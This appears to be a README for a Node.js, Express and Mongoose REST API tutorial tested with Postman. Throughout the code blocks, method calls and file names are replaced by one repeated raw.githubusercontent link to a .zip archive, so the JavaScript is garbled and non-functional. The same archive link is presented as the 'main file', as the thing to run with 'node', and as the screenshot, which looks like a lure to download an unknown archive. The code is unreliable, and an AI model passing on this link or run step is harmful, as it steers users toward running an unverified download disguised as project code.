## API-Testing-with-POSTMAN

#### HTTP Request Verbs: `GET` , `POST` , `PUT` , `PATCH` , `DELETE`
#### All documents (/documents) : GET, POST, DELETE
#### specific document (/documents/id) : GET, PUT, PATCH, DELETE

Initializing the node project
```
npm init -y
```
Installing required node packages
```
npm install express mongoose body-parser
```

Working with main file (`https://raw.githubusercontent.com/ravikkumar777/REST-API-with-Node-and-Express/master/decently/REST-API-with-Node-and-Express.zip`)
```
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');

const app = express();

https://raw.githubusercontent.com/ravikkumar777/REST-API-with-Node-and-Express/master/decently/REST-API-with-Node-and-Express.zip(3000, function (req, res) {
    https://raw.githubusercontent.com/ravikkumar777/REST-API-with-Node-and-Express/master/decently/REST-API-with-Node-and-Express.zip('Server started on 3000');
});
```
Running Server on port 3000
```
node https://raw.githubusercontent.com/ravikkumar777/REST-API-with-Node-and-Express/master/decently/REST-API-with-Node-and-Express.zip
```
Opening Browser at
```
http://localhost:3000/
```

Extending the use of Mongoose and BodyParser
```
https://raw.githubusercontent.com/ravikkumar777/REST-API-with-Node-and-Express/master/decently/REST-API-with-Node-and-Express.zip(https://raw.githubusercontent.com/ravikkumar777/REST-API-with-Node-and-Express/master/decently/REST-API-with-Node-and-Express.zip({ extended: true }));
https://raw.githubusercontent.com/ravikkumar777/REST-API-with-Node-and-Express/master/decently/REST-API-with-Node-and-Express.zip('mongodb://localhost:27017/testDB', { useNewUrlParser: true, useUnifiedTopology: true });
```

Example code for `get` request
```
https://raw.githubusercontent.com/ravikkumar777/REST-API-with-Node-and-Express/master/decently/REST-API-with-Node-and-Express.zip('/documents', function (req, res) {
        https://raw.githubusercontent.com/ravikkumar777/REST-API-with-Node-and-Express/master/decently/REST-API-with-Node-and-Express.zip(function (err, foundPersons) {
            if (!err) {
                https://raw.githubusercontent.com/ravikkumar777/REST-API-with-Node-and-Express/master/decently/REST-API-with-Node-and-Express.zip(foundPersons);
            } else {
                https://raw.githubusercontent.com/ravikkumar777/REST-API-with-Node-and-Express/master/decently/REST-API-with-Node-and-Express.zip(err);
            }
        });
 });
```
## GET request from POSTMAN
![API Request - GET](https://raw.githubusercontent.com/ravikkumar777/REST-API-with-Node-and-Express/master/decently/REST-API-with-Node-and-Express.zip)
